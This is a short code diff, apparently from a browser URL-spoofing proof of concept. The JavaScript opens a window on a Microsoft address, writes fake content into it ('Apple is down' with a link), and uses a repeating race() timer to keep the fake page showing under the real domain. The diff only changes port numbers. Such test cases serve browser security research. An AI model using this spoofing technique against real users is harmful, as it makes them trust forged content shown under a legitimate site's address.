@@ -16,13 +16,13 @@
         windowSpoof.location.href !== 'about:blank';
       }
       catch (e) {
-        windowSpoof.location.href='https://www.google.com:8080';
+        windowSpoof.location.href='https://www.google.com:82';
       }
     }
     
     function startSpoof() {
 
-      windowSpoof = window.open("https://www.microsoft.com:8080","x");
+      windowSpoof = window.open("https://www.microsoft.com:82","x");
       windowSpoof.document.write("<h2>Apple is down. please visit <a href="https://bing.com">Here</a></h2>");
 
       setInterval('race()', 100);
